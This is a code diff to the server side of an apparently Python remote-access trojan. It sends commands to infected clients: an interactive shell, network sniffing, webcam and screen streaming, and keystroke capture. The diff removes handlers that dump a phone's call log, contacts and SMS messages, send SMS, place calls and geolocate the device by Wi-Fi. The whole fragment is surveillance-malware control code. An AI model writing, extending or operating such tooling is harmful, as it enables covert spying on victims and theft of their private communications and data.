@@ -120,7 +120,7 @@ def handle_client(client_socket, addr):
 
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
-            
+
         if command == "shell":
             print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
             while True:
@@ -140,42 +140,6 @@ def handle_client(client_socket, addr):
         if command.startswith("webcam_stream") or command.startswith("screen_stream"):
             mode = command.split('_')[0]
             start_streaming(client_socket, mode)
-            continue
-
-        if command.startswith("dump_call_log"):
-            client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + output)
-            continue
-
-        if command.startswith("dump_contacts"):
-            client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + f"[*] Fetching {output.count('\n')} contacts into list\n[*] Contacts list saved to: contacts_dump_{target_ip}.txt")
-            continue
-
-        if command.startswith("dump_sms"):
-            client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + f"[*] Fetching {output.count('\n')} sms messages\n[*] SMS messages saved to: sms_dump_{target_ip}.txt")
-            continue
-        
-        if command.startswith("send_sms"):
-            client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + "[+] SMS sent - Transmission successful")
-            continue
-
-        if command.startswith("wlan_geolocate"):
-            client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + output)
-            continue
-
-        if command.startswith("call"):
-            client_socket.send(command.encode('utf-8'))
-            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
-            print(Fore.WHITE + output)
             continue
 
         if command == "keyscan_start":
